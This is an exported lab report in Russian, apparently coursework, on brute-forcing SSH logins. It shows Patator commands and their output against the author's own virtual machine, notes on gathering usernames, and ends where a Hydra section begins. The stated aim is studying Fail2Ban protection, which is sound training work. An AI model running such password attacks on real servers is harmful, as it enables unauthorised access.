@@ -1,0 +1,1176 @@
+<html>
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<title>Часть 4.9.1 Brute-force на SSH</title>
+	<style>
+		/* cspell:disable-file */
+		/* webkit printing magic: print all background colors */
+		html {
+			-webkit-print-color-adjust: exact;
+		}
+
+		* {
+			box-sizing: border-box;
+			-webkit-print-color-adjust: exact;
+		}
+
+		html,
+		body {
+			margin: 0;
+			padding: 0;
+		}
+
+		@media only screen {
+			body {
+				margin: 2em auto;
+				max-width: 900px;
+				color: rgb(55, 53, 47);
+			}
+		}
+
+		body {
+			line-height: 1.5;
+			/* white-space: pre-wrap; */
+		}
+
+		a,
+		a.visited {
+			color: inherit;
+			text-decoration: underline;
+		}
+
+		.pdf-relative-link-path {
+			font-size: 80%;
+			color: #444;
+		}
+
+		h1,
+		h2,
+		h3 {
+			letter-spacing: -0.01em;
+			line-height: 1.2;
+			font-weight: 600;
+			margin-bottom: 0;
+		}
+
+		.page-title {
+			font-size: 2.5rem;
+			font-weight: 700;
+			margin-top: 0;
+			margin-bottom: 0.75em;
+		}
+
+		h1 {
+			font-size: 1.875rem;
+			margin-top: 1.875rem;
+		}
+
+		h2 {
+			font-size: 1.5rem;
+			margin-top: 1.5rem;
+		}
+
+		h3 {
+			font-size: 1.25rem;
+			margin-top: 1.25rem;
+		}
+
+		.source {
+			border: 1px solid #ddd;
+			border-radius: 3px;
+			padding: 1.5em;
+			word-break: break-all;
+		}
+
+		.callout {
+			border-radius: 3px;
+			padding: 1rem;
+		}
+
+		figure {
+			margin: 1.25em 0;
+			page-break-inside: avoid;
+		}
+
+		figcaption {
+			opacity: 0.5;
+			font-size: 85%;
+			margin-top: 0.5em;
+		}
+
+		mark {
+			background-color: transparent;
+		}
+
+		.indented {
+			padding-left: 1.5em;
+		}
+
+		hr {
+			background: transparent;
+			display: block;
+			width: 100%;
+			height: 1px;
+			visibility: visible;
+			border: none;
+			border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+		}
+
+		img {
+			max-width: 100%;
+		}
+
+		@media only print {
+			img {
+				max-height: 100vh;
+				object-fit: contain;
+			}
+		}
+
+		@page {
+			margin: 1in;
+		}
+
+		.collection-content {
+			font-size: 0.875rem;
+		}
+
+		.column-list {
+			display: flex;
+			justify-content: space-between;
+		}
+
+		.column {
+			padding: 0 1em;
+		}
+
+		.column:first-child {
+			padding-left: 0;
+		}
+
+		.column:last-child {
+			padding-right: 0;
+		}
+
+		.table_of_contents-item {
+			display: block;
+			font-size: 0.875rem;
+			line-height: 1.3;
+			padding: 0.125rem;
+		}
+
+		.table_of_contents-indent-1 {
+			margin-left: 1.5rem;
+		}
+
+		.table_of_contents-indent-2 {
+			margin-left: 3rem;
+		}
+
+		.table_of_contents-indent-3 {
+			margin-left: 4.5rem;
+		}
+
+		.table_of_contents-link {
+			text-decoration: none;
+			opacity: 0.7;
+			border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+		}
+
+		table,
+		th,
+		td {
+			border: 1px solid rgba(55, 53, 47, 0.09);
+			border-collapse: collapse;
+		}
+
+		table {
+			border-left: none;
+			border-right: none;
+		}
+
+		th,
+		td {
+			font-weight: normal;
+			padding: 0.25em 0.5em;
+			line-height: 1.5;
+			min-height: 1.5em;
+			text-align: left;
+		}
+
+		th {
+			color: rgba(55, 53, 47, 0.6);
+		}
+
+		ol,
+		ul {
+			margin: 0;
+			margin-block-start: 0.6em;
+			margin-block-end: 0.6em;
+		}
+
+		li>ol:first-child,
+		li>ul:first-child {
+			margin-block-start: 0.6em;
+		}
+
+		ul>li {
+			list-style: disc;
+		}
+
+		ul.to-do-list {
+			padding-inline-start: 0;
+		}
+
+		ul.to-do-list>li {
+			list-style: none;
+		}
+
+		.to-do-children-checked {
+			text-decoration: line-through;
+			opacity: 0.375;
+		}
+
+		ul.toggle>li {
+			list-style: none;
+		}
+
+		ul {
+			padding-inline-start: 1.7em;
+		}
+
+		ul>li {
+			padding-left: 0.1em;
+		}
+
+		ol {
+			padding-inline-start: 1.6em;
+		}
+
+		ol>li {
+			padding-left: 0.2em;
+		}
+
+		.mono ol {
+			padding-inline-start: 2em;
+		}
+
+		.mono ol>li {
+			text-indent: -0.4em;
+		}
+
+		.toggle {
+			padding-inline-start: 0em;
+			list-style-type: none;
+		}
+
+		/* Indent toggle children */
+		.toggle>li>details {
+			padding-left: 1.7em;
+		}
+
+		.toggle>li>details>summary {
+			margin-left: -1.1em;
+		}
+
+		.selected-value {
+			display: inline-block;
+			padding: 0 0.5em;
+			background: rgba(206, 205, 202, 0.5);
+			border-radius: 3px;
+			margin-right: 0.5em;
+			margin-top: 0.3em;
+			margin-bottom: 0.3em;
+			white-space: nowrap;
+		}
+
+		.collection-title {
+			display: inline-block;
+			margin-right: 1em;
+		}
+
+		.page-description {
+			margin-bottom: 2em;
+		}
+
+		.simple-table {
+			margin-top: 1em;
+			font-size: 0.875rem;
+			empty-cells: show;
+		}
+
+		.simple-table td {
+			height: 29px;
+			min-width: 120px;
+		}
+
+		.simple-table th {
+			height: 29px;
+			min-width: 120px;
+		}
+
+		.simple-table-header-color {
+			background: rgb(247, 246, 243);
+			color: black;
+		}
+
+		.simple-table-header {
+			font-weight: 500;
+		}
+
+		time {
+			opacity: 0.5;
+		}
+
+		.icon {
+			display: inline-block;
+			max-width: 1.2em;
+			max-height: 1.2em;
+			text-decoration: none;
+			vertical-align: text-bottom;
+			margin-right: 0.5em;
+		}
+
+		img.icon {
+			border-radius: 3px;
+		}
+
+		.user-icon {
+			width: 1.5em;
+			height: 1.5em;
+			border-radius: 100%;
+			margin-right: 0.5rem;
+		}
+
+		.user-icon-inner {
+			font-size: 0.8em;
+		}
+
+		.text-icon {
+			border: 1px solid #000;
+			text-align: center;
+		}
+
+		.page-cover-image {
+			display: block;
+			object-fit: cover;
+			width: 100%;
+			max-height: 30vh;
+		}
+
+		.page-header-icon {
+			font-size: 3rem;
+			margin-bottom: 1rem;
+		}
+
+		.page-header-icon-with-cover {
+			margin-top: -0.72em;
+			margin-left: 0.07em;
+		}
+
+		.page-header-icon img {
+			border-radius: 3px;
+		}
+
+		.link-to-page {
+			margin: 1em 0;
+			padding: 0;
+			border: none;
+			font-weight: 500;
+		}
+
+		p>.user {
+			opacity: 0.5;
+		}
+
+		td>.user,
+		td>time {
+			white-space: nowrap;
+		}
+
+		input[type="checkbox"] {
+			transform: scale(1.5);
+			margin-right: 0.6em;
+			vertical-align: middle;
+		}
+
+		p {
+			margin-top: 0.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.image {
+			border: none;
+			margin: 1.5em 0;
+			padding: 0;
+			border-radius: 0;
+			text-align: center;
+		}
+
+		.code,
+		code {
+			background: rgba(135, 131, 120, 0.15);
+			border-radius: 3px;
+			padding: 0.2em 0.4em;
+			border-radius: 3px;
+			font-size: 85%;
+			tab-size: 2;
+		}
+
+		code {
+			color: #eb5757;
+		}
+
+		.code {
+			padding: 1.5em 1em;
+		}
+
+		.code-wrap {
+			white-space: pre-wrap;
+			word-break: break-all;
+		}
+
+		.code>code {
+			background: none;
+			padding: 0;
+			font-size: 100%;
+			color: inherit;
+		}
+
+		blockquote {
+			font-size: 1.25em;
+			margin: 1em 0;
+			padding-left: 1em;
+			border-left: 3px solid rgb(55, 53, 47);
+		}
+
+		.bookmark {
+			text-decoration: none;
+			max-height: 8em;
+			padding: 0;
+			display: flex;
+			width: 100%;
+			align-items: stretch;
+		}
+
+		.bookmark-title {
+			font-size: 0.85em;
+			overflow: hidden;
+			text-overflow: ellipsis;
+			height: 1.75em;
+			white-space: nowrap;
+		}
+
+		.bookmark-text {
+			display: flex;
+			flex-direction: column;
+		}
+
+		.bookmark-info {
+			flex: 4 1 180px;
+			padding: 12px 14px 14px;
+			display: flex;
+			flex-direction: column;
+			justify-content: space-between;
+		}
+
+		.bookmark-image {
+			width: 33%;
+			flex: 1 1 180px;
+			display: block;
+			position: relative;
+			object-fit: cover;
+			border-radius: 1px;
+		}
+
+		.bookmark-description {
+			color: rgba(55, 53, 47, 0.6);
+			font-size: 0.75em;
+			overflow: hidden;
+			max-height: 4.5em;
+			word-break: break-word;
+		}
+
+		.bookmark-href {
+			font-size: 0.75em;
+			margin-top: 0.25em;
+		}
+
+		.sans {
+			font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+		}
+
+		.code {
+			font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace;
+		}
+
+		.serif {
+			font-family: Lyon-Text, Georgia, ui-serif, serif;
+		}
+
+		.mono {
+			font-family: iawriter-mono, Nitti, Menlo, Courier, monospace;
+		}
+
+		.pdf .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .sans {
+			font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR';
+		}
+
+		.pdf .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .code {
+			font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR';
+		}
+
+		.pdf .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .serif {
+			font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR';
+		}
+
+		.pdf .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP';
+		}
+
+		.pdf:lang(zh-CN) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC';
+		}
+
+		.pdf:lang(zh-TW) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC';
+		}
+
+		.pdf:lang(ko-KR) .mono {
+			font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR';
+		}
+
+		.highlight-default {
+			color: rgba(55, 53, 47, 1);
+		}
+
+		.highlight-gray {
+			color: rgba(120, 119, 116, 1);
+			fill: rgba(120, 119, 116, 1);
+		}
+
+		.highlight-brown {
+			color: rgba(159, 107, 83, 1);
+			fill: rgba(159, 107, 83, 1);
+		}
+
+		.highlight-orange {
+			color: rgba(217, 115, 13, 1);
+			fill: rgba(217, 115, 13, 1);
+		}
+
+		.highlight-yellow {
+			color: rgba(203, 145, 47, 1);
+			fill: rgba(203, 145, 47, 1);
+		}
+
+		.highlight-teal {
+			color: rgba(68, 131, 97, 1);
+			fill: rgba(68, 131, 97, 1);
+		}
+
+		.highlight-blue {
+			color: rgba(51, 126, 169, 1);
+			fill: rgba(51, 126, 169, 1);
+		}
+
+		.highlight-purple {
+			color: rgba(144, 101, 176, 1);
+			fill: rgba(144, 101, 176, 1);
+		}
+
+		.highlight-pink {
+			color: rgba(193, 76, 138, 1);
+			fill: rgba(193, 76, 138, 1);
+		}
+
+		.highlight-red {
+			color: rgba(212, 76, 71, 1);
+			fill: rgba(212, 76, 71, 1);
+		}
+
+		.highlight-default_background {
+			color: rgba(55, 53, 47, 1);
+		}
+
+		.highlight-gray_background {
+			background: rgba(241, 241, 239, 1);
+		}
+
+		.highlight-brown_background {
+			background: rgba(244, 238, 238, 1);
+		}
+
+		.highlight-orange_background {
+			background: rgba(251, 236, 221, 1);
+		}
+
+		.highlight-yellow_background {
+			background: rgba(251, 243, 219, 1);
+		}
+
+		.highlight-teal_background {
+			background: rgba(237, 243, 236, 1);
+		}
+
+		.highlight-blue_background {
+			background: rgba(231, 243, 248, 1);
+		}
+
+		.highlight-purple_background {
+			background: rgba(244, 240, 247, 0.8);
+		}
+
+		.highlight-pink_background {
+			background: rgba(249, 238, 243, 0.8);
+		}
+
+		.highlight-red_background {
+			background: rgba(253, 235, 236, 1);
+		}
+
+		.block-color-default {
+			color: inherit;
+			fill: inherit;
+		}
+
+		.block-color-gray {
+			color: rgba(120, 119, 116, 1);
+			fill: rgba(120, 119, 116, 1);
+		}
+
+		.block-color-brown {
+			color: rgba(159, 107, 83, 1);
+			fill: rgba(159, 107, 83, 1);
+		}
+
+		.block-color-orange {
+			color: rgba(217, 115, 13, 1);
+			fill: rgba(217, 115, 13, 1);
+		}
+
+		.block-color-yellow {
+			color: rgba(203, 145, 47, 1);
+			fill: rgba(203, 145, 47, 1);
+		}
+
+		.block-color-teal {
+			color: rgba(68, 131, 97, 1);
+			fill: rgba(68, 131, 97, 1);
+		}
+
+		.block-color-blue {
+			color: rgba(51, 126, 169, 1);
+			fill: rgba(51, 126, 169, 1);
+		}
+
+		.block-color-purple {
+			color: rgba(144, 101, 176, 1);
+			fill: rgba(144, 101, 176, 1);
+		}
+
+		.block-color-pink {
+			color: rgba(193, 76, 138, 1);
+			fill: rgba(193, 76, 138, 1);
+		}
+
+		.block-color-red {
+			color: rgba(212, 76, 71, 1);
+			fill: rgba(212, 76, 71, 1);
+		}
+
+		.block-color-default_background {
+			color: inherit;
+			fill: inherit;
+		}
+
+		.block-color-gray_background {
+			background: rgba(241, 241, 239, 1);
+		}
+
+		.block-color-brown_background {
+			background: rgba(244, 238, 238, 1);
+		}
+
+		.block-color-orange_background {
+			background: rgba(251, 236, 221, 1);
+		}
+
+		.block-color-yellow_background {
+			background: rgba(251, 243, 219, 1);
+		}
+
+		.block-color-teal_background {
+			background: rgba(237, 243, 236, 1);
+		}
+
+		.block-color-blue_background {
+			background: rgba(231, 243, 248, 1);
+		}
+
+		.block-color-purple_background {
+			background: rgba(244, 240, 247, 0.8);
+		}
+
+		.block-color-pink_background {
+			background: rgba(249, 238, 243, 0.8);
+		}
+
+		.block-color-red_background {
+			background: rgba(253, 235, 236, 1);
+		}
+
+		.select-value-color-uiBlue {
+			background-color: rgba(35, 131, 226, .07);
+		}
+
+		.select-value-color-pink {
+			background-color: rgba(245, 224, 233, 1);
+		}
+
+		.select-value-color-purple {
+			background-color: rgba(232, 222, 238, 1);
+		}
+
+		.select-value-color-green {
+			background-color: rgba(219, 237, 219, 1);
+		}
+
+		.select-value-color-gray {
+			background-color: rgba(227, 226, 224, 1);
+		}
+
+		.select-value-color-transparentGray {
+			background-color: rgba(227, 226, 224, 0);
+		}
+
+		.select-value-color-translucentGray {
+			background-color: rgba(0, 0, 0, 0.06);
+		}
+
+		.select-value-color-orange {
+			background-color: rgba(250, 222, 201, 1);
+		}
+
+		.select-value-color-brown {
+			background-color: rgba(238, 224, 218, 1);
+		}
+
+		.select-value-color-red {
+			background-color: rgba(255, 226, 221, 1);
+		}
+
+		.select-value-color-yellow {
+			background-color: rgba(253, 236, 200, 1);
+		}
+
+		.select-value-color-blue {
+			background-color: rgba(211, 229, 239, 1);
+		}
+
+		.select-value-color-pageGlass {
+			background-color: undefined;
+		}
+
+		.select-value-color-washGlass {
+			background-color: undefined;
+		}
+
+		.checkbox {
+			display: inline-flex;
+			vertical-align: text-bottom;
+			width: 16;
+			height: 16;
+			background-size: 16px;
+			margin-left: 2px;
+			margin-right: 5px;
+		}
+	</style>
+</head>
+
+<body>
+	<article id="131aa64c-9d0a-8114-bb7a-f04114fdc0ef" class="page sans">
+		<header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_william_morris_1878.jpg"
+				style="object-position:center 0%" />
+			<div class="page-header-icon page-header-icon-with-cover"><img class="icon"
+					src="https://www.notion.so/icons/alien-pixel_red.svg" /></div>
+			<h1 class="page-title"><strong>Часть 4.9.1 Brute-force на SSH</strong></h1>
+			<p class="page-description"></p>
+		</header>
+		<div class="page-body">
+			<h2 id="131aa64c-9d0a-81c6-9b8f-e33f8fa66594" class=""><strong>Задача:</strong></h2>
+			<ol type="1" id="131aa64c-9d0a-81e7-b4fd-f696a922f076" class="numbered-list" start="1">
+				<li>Составить словари с паролями с помощью утилит: <strong>pwdlogy &amp; crunch</strong></li>
+			</ol>
+			<ol type="1" id="131aa64c-9d0a-81ca-8fbd-f1076a7bce10" class="numbered-list" start="2">
+				<li>Произвести Brute-force на SSH с помощью инструментов:</li>
+			</ol>
+			<ul id="131aa64c-9d0a-81be-afc1-e3d2f2595441" class="bulleted-list">
+				<li style="list-style-type:disc">Patator</li>
+			</ul>
+			<ul id="131aa64c-9d0a-813b-be39-def91f2e3f45" class="bulleted-list">
+				<li style="list-style-type:disc">Hydra</li>
+			</ul>
+			<ul id="131aa64c-9d0a-81aa-aae4-db6c52deface" class="bulleted-list">
+				<li style="list-style-type:disc">Medusa</li>
+			</ul>
+			<ul id="131aa64c-9d0a-81db-a151-d0774b9327d0" class="bulleted-list">
+				<li style="list-style-type:disc">Metasploit</li>
+			</ul>
+			<ol type="1" id="131aa64c-9d0a-8127-8177-c5807ea54bfd" class="numbered-list" start="3">
+				<li>Сделать скриншоты с ключевыми моментами, предоставить описание к ним и добавить в общий отчёт.</li>
+			</ol>
+			<h2 id="131aa64c-9d0a-814d-8545-f646f3aa764e" class=""><strong>Цель работы:</strong></h2>
+			<ul id="131aa64c-9d0a-81f8-b266-d9ff8aff952f" class="bulleted-list">
+				<li style="list-style-type:disc">Произвести атаки с защитой Fail2Ban и без защиты, чтобы понять механизм
+					работыFail2Ban.</li>
+			</ul>
+			<figure class="block-color-gray_background callout" style=" display:flex"
+				id="131aa64c-9d0a-811d-a882-c0a1332d8c44">
+				<div style="font-size:1.5em"><span class="icon">💡</span></div>
+				<div style="width:100%">Брутфорс (от англ. brute force — грубая сила) — метод угадывания пароля (или
+					ключа, используемого для шифрования), предполагающий систематический перебор всех возможных
+					комбинаций символов до тех пор, пока не будет найдена правильная комбинация.</div>
+			</figure>
+			<p id="131aa64c-9d0a-81a0-8315-ea3c478855a9" class="">Пусть у нас есть SSH-cepвep с IР-адресом
+				<code>111.11.11.11</code> (адрес приводится исключительно для примера). Наша задача каким-то образом
+				узнать имя пользователя, который зарегистрирован на сервере. Имя root пробовать не стоит, так как обычно
+				его отключают для входа по SSH. Поэтому нужно как-то раздобыть другое имя пользователя. Как это сделать?
+				Haпpимep, с помощью уязвимости в том же Apache. Можно также попробовать часто используемые имена вроде
+				admin, test, user. Для брутфорса можно использовать следующие иструменты: <code>Patator</code>,
+				<code>Medusa</code>, <code>Hydra</code>, <code>Metasploit</code>. Все они доступны в дистрибутиве Kali
+				Linux.</p>
+			<p id="131aa64c-9d0a-813c-bd51-d4acc5a25c32" class="">Далее мы разберем каждый инструмент на практике.</p>
+			<h1 id="131aa64c-9d0a-817a-8f0b-e1d8a0559cfc" class="">Прежде чем начать атаки, нам нужно составить словари:
+			</h1>
+			<figure id="131aa64c-9d0a-812c-9330-cc323f1ea783" class="block-color-red link-to-page"><a
+					href="Часть 4 9 1 Brute-force на SSH/Практическая работа “pwdlogy & crunch”.html"><img
+						class="icon" src="https://www.notion.so/icons/sign-in_green.svg" />Практическая работа “pwdlogy
+					&amp; crunch” </a></figure>
+			<h1 id="131aa64c-9d0a-81c7-9cce-ccca5a486bf1" class=""><strong>1. Patator</strong></h1>
+			<p id="131aa64c-9d0a-810c-ae8d-f4eb925873a1" class="">Для подбора пароля средствами Patator используется
+				команда:</p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-81a4-91ce-eaf1ae7d768c"
+				class="code"><code class="language-Bash">patator ssh_login host=lll.11.11.11 user=test password=FIIEO O=/root/wordlist -х ignore:mesg=&#x27;Authentication failed&#x27;</code></pre>
+			<table id="131aa64c-9d0a-812f-ae01-e288f723bf20" class="simple-table">
+				<tbody>
+					<tr id="131aa64c-9d0a-817b-895a-e8bff10d69f1">
+						<td id="z`fd" class=""><strong>Параметр</strong></td>
+						<td id="CPZN" class=""><strong>Значение</strong></td>
+					</tr>
+					<tr id="131aa64c-9d0a-8135-b8be-f7c4a39653c7">
+						<td id="z`fd" class=""><code><strong>ssh_login</strong></code></td>
+						<td id="CPZN" class="">необходимый модуль</td>
+					</tr>
+					<tr id="131aa64c-9d0a-81b3-b420-c2e17b01e2f1">
+						<td id="z`fd" class=""><code><strong>host</strong></code></td>
+						<td id="CPZN" class="">наша цель</td>
+					</tr>
+					<tr id="131aa64c-9d0a-81c2-b7cd-ee0e0cb4928a">
+						<td id="z`fd" class=""><code><strong>user</strong></code></td>
+						<td id="CPZN" class="">логин пользователя, к которому подбирается пароль или файл с логинами для
+							множественного подбора</td>
+					</tr>
+					<tr id="131aa64c-9d0a-813c-8ccd-ed085427d641">
+						<td id="z`fd" class=""><code><strong>password</strong></code></td>
+						<td id="CPZN" class="">словарь с паролями</td>
+					</tr>
+					<tr id="131aa64c-9d0a-81bc-bffc-fc26e871065d">
+						<td id="z`fd" class="">
+							<code><strong>-х ignore:mesg= &#x27;Authentication failed&#x27;</strong></code></td>
+						<td id="CPZN" class="">команда не выводить на экран строку, имеющую данное сообщение. Параметр
+							фильтрации подбирается индивидуально. То есть в зависимости от версии и настроек сервера,
+							сообщение об неудачной аутентификации может быть другим</td>
+					</tr>
+				</tbody>
+			</table>
+			<h2 id="131aa64c-9d0a-8155-9181-d1c438f5b950" class=""><strong>Практика</strong></h2>
+			<h2 id="131aa64c-9d0a-812a-8143-c0d11a9e00ba" class="">1.1 Запустим сервис ssh</h2>
+			<figure id="131aa64c-9d0a-8127-a855-e2526c29a059" class="image"><a
+					href="https://i.imgur.com/4GHAWBp.png"><img src="https://i.imgur.com/4GHAWBp.png" /></a></figure>
+			<h2 id="131aa64c-9d0a-815b-ab79-ee6ffb991e79" class="">1.2 Попробуем подключиться</h2>
+			<p id="131aa64c-9d0a-81c3-9b9d-c9909cf47c2c" class="">Все успешно, так что попробуем сбрутить наш пароль от
+				ssh</p>
+			<figure id="131aa64c-9d0a-8132-9154-e57027f9a400" class="image"><a
+					href="https://i.imgur.com/lBv9z69.png"><img src="https://i.imgur.com/lBv9z69.png" /></a></figure>
+			<h2 id="131aa64c-9d0a-8110-9e26-d10398640fb6" class="">1.3 Для брутфорса нам потребуется файл с паролями,
+				если вы хотите перебрать много паролей, то воспользуйтесь файлом с гита: </h2>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-81ff-9ba2-e8a30cc2f065"
+				class="code"><code class="language-Bash">wget https://github.com/duyet/bruteforce-database/blob/master/2151220-passwords.txt</code></pre>
+			<figure id="131aa64c-9d0a-81a5-9b4e-cde4fb522c0e" class="image"><a
+					href="https://i.imgur.com/LuRpj1v.png"><img src="https://i.imgur.com/LuRpj1v.png" /></a></figure>
+			<h2 id="131aa64c-9d0a-8160-a234-d3ea424d720b" class="">1.4 Мы создадим свои файлы, чтобы посмотреть на
+				практике (включая верный пароль для аутентификации)</h2>
+			<figure id="131aa64c-9d0a-818f-b2dc-f16fa4dfd8d5" class="image"><a
+					href="https://i.imgur.com/nIqDmIG.png"><img src="https://i.imgur.com/nIqDmIG.png" /></a></figure>
+			<h2 id="131aa64c-9d0a-81a7-b6bf-f33c88285894" class="">1.5 Будем использовать наш IP</h2>
+			<figure id="131aa64c-9d0a-81bd-bdb2-dff008da8b7f" class="image"><a
+					href="https://i.imgur.com/tmouMfY.png"><img src="https://i.imgur.com/tmouMfY.png" /></a></figure>
+			<h2 id="131aa64c-9d0a-819b-8099-c4c4adb71ffd" class="">1.6 В нашем случае воспользуемся командой:</h2>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-8123-a1ee-c22d27400136"
+				class="code"><code class="language-Bash">patator ssh_login host=192.168.79.144 user=FILE0 password=FILE1 0=user_name.txt 1=passwords.txt -x ignore:mesg=&#x27;Authentication failed&#x27;</code></pre>
+			<figure id="131aa64c-9d0a-8181-9b50-dab4f1f16ae4" class="image"><a
+					href="https://i.imgur.com/UTSouz7.png"><img src="https://i.imgur.com/UTSouz7.png" /></a></figure>
+			<p id="131aa64c-9d0a-81ed-bafc-fd678429342a" class=""><strong>И видим результат!</strong></p>
+			<p id="131aa64c-9d0a-81c0-9eac-f91747b25e1d" class="">Подобран верный пароль: </p>
+			<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
+				integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg=="
+				crossorigin="anonymous" referrerPolicy="no-referrer"></script>
+			<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css"
+				integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ=="
+				crossorigin="anonymous" referrerPolicy="no-referrer" />
+			<pre id="131aa64c-9d0a-8176-b954-cfd999c57b53"
+				class="code"><code class="language-Bash">11:20:29 patator INFO - 0 33 0.035 | user:Kali123 | 23 | SSH-2.0-OpenSSH_9.0p1 Debian-1+b1</code></pre>
+			<h1 id="131aa64c-9d0a-8102-ab35-ff40acf245dd" class=""><strong>2. Hydra</strong></h1>
